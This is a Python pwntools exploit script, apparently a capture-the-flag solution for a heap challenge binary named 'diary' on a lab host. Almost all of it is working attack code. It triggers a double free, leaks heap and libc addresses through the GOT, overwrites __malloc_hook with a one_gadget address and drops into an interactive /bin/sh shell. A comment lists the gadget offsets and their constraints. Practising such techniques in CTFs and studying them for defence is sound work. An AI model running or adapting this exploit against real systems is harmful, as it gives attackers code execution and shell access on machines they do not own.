#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 10.10.23.10 --port 2228 diary
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('diary')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '10.10.23.10'
port = int(args.PORT or 2228)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(['./ld-2.31.so', exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'/home/pwn/lib'

io = start(env={'LD_PRELOAD': './libc.so.6'})

def add(mark, sz, val):
    io.sendlineafter('choice: ', '1')
    io.sendlineafter('mark: ', str(mark))
    io.sendlineafter('comment: ', str(sz))
    io.sendafter('comment: ', val)

def edit(idx, mark, sz, val):
    io.sendlineafter('choice: ', '2')
    io.sendlineafter('index: ', str(idx))
    io.sendlineafter('mark: ', str(mark))
    io.sendlineafter('comment: ', str(sz))
    io.sendafter('comment: ', val)

def view(idx):
    io.sendlineafter('choice: ', '3')
    io.sendlineafter('index: ', str(idx))

def delete(idx):
    io.sendlineafter('choice: ', '4')
    io.sendlineafter('index: ', str(idx))


for i in range(9):
    add(0, 100, b'qwe')

for i in range(7):
    delete(i)


delete(7)
delete(8)
delete(7)

view(7)
x = io.recvline()
log.info(x)
heap = x.split(b'Comment: ')[1].split(b'1)')[0]
heap = unpack(heap, 'all')
log.success(f'heap: {heap:x}')

x = heap & 0xffffffff
for i in range(8):
    add(heap + 0x200, 100, b'\x00' * 8)

add(heap + 0x200, 10, b'\x00' * 8)

view(7)

edit(8, 1234, 16, p64(0xdead) + p64(0x404020))

view(7)
libc = ELF('./libc.so.6')
x = io.recvline()
log.info(x)
x = x.split(b'Comment: ')[1].split(b'1)')[0]
x = unpack(x, 'all')
libc.address = x - libc.sym.puts
log.success(f'libc: {libc.address:x}')

edit(8, 1234, 16, p64(0xdead) + p64(heap+0x10))

# edit(7, 1234, 100, p64(libc.sym['__free_hook']))

# add(0, 100, b'/bin/sh\x00')
# add(0, 100, p64(libc.sym.system))

edit(7, 1234, 100, p64(libc.sym['__malloc_hook']))

add(0, 100, b'/bin/sh\x00')
add(0, 100, p64(libc.address + 0xe69a1))

'''
0xe699e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe69a1 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe69a4 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x10af39 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
          
'''

io.interactive()

